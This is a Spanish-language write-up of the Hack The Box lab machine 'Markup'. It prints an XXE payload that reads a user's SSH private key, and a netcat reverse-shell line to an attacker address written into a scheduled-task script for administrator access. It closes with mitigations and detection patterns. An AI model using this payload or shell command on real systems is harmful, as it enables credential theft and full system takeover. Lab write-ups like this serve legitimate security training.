---
machine: Markup
os: Windows
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [windows, xxe, ssh, scheduled-task, tier2]
---

# Markup — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Available · Starting Point · Tier 2 · Windows · Very Easy

## TL;DR

El blog procesa XML en el login/búsqueda y es vulnerable a **XXE**: se lee la clave SSH privada de `Daniel` desde `C:\Users\Daniel\.ssh\id_rsa`, se entra por SSH y se sobrescribe `C:\Log-Management\job.bat`, que una tarea programada ejecuta como administrador.

---

## Reconocimiento

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
```

```text
22/tcp  ssh   OpenSSH for_Windows_8.1
80/tcp  http  Apache httpd 2.4.41 (Win64) PHP/7.4
```

## Enumeración

```bash
curl -s http://<TARGET_IP>/ | head -50
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

- `/` es un blog con login y buscador.
- `/index.php` y `/login.php` aceptan `POST` con `Content-Type: application/xml`.
- `robots.txt` y el pie de página mencionan el usuario `Daniel`.

## Foothold

El parser XML procesa entidades externas. Payload para leer la clave:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Users/Daniel/.ssh/id_rsa">]>
<data><user>&xxe;</user><password>x</password></data>
```

```bash
curl -s -X POST http://<TARGET_IP>/login.php \
  -H 'Content-Type: application/xml' --data-binary @xxe.xml
```

La respuesta devuelve la clave privada. Se guarda, se ajustan permisos y se entra:

```bash
chmod 600 id_rsa
ssh -i id_rsa Daniel@<TARGET_IP>
```

## Movimiento lateral

```powershell
whoami
type C:\Users\Daniel\Desktop\user.txt
icacls C:\Log-Management
```

`C:\Log-Management\job.bat` es escribible por `Daniel` y una tarea programada lo ejecuta periódicamente como administrador.

## Escalada de privilegios

```powershell
copy C:\Windows\System32\nc64.exe C:\Log-Management\nc64.exe
echo C:\Log-Management\nc64.exe -e cmd.exe <ATTACKER_IP> 1337 > C:\Log-Management\job.bat
```

Con `nc -lvnp 1337` escuchando, en el siguiente ciclo de la tarea llega una shell de administrador:

```text
C:\Windows\system32> whoami
markup\administrator
```

```text
type C:\Users\Administrator\Desktop\root.txt
```

## Evidencia

- Petición XXE y respuesta con la clave redactada.
- `icacls` sobre el directorio y `whoami` como administrador.

## Lecciones aprendidas

- Un `Content-Type: application/xml` es una invitación a probar entidades externas.
- XXE puede leer ficheros fuera del webroot; en Windows, rutas `file:///C:/...`.
- Las tareas programadas sobre scripts escribibles son escalada inmediata.
- El binario `nc64.exe` copiado al directorio de logs evita depender de descargas.

## Mitigaciones y detección

- Deshabilitar DTD y entidades externas (`libxml_disable_entity_loader`, parser sin `resolve_entities`).
- Claves privadas con ACLs estrictas y passphrase.
- Directorios de scripts de sistema sin escritura para usuarios.
- Detección: peticiones con `<!DOCTYPE` y `SYSTEM "file://`, lectura de `id_rsa`, modificaciones en `C:\Log-Management`.

- CWE-611: Improper Restriction of XML External Entity Reference
- CWE-732: Incorrect Permission Assignment for Critical Resource
- MITRE ATT&CK: [T1190](https://attack.mitre.org/techniques/T1190/), [T1053.005 Scheduled Task](https://attack.mitre.org/techniques/T1053/005/), [T1552.004 Private Keys](https://attack.mitre.org/techniques/T1552/004/)

## Referencias

- [OWASP — XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger — XXE](https://portswigger.net/web-security/xxe)
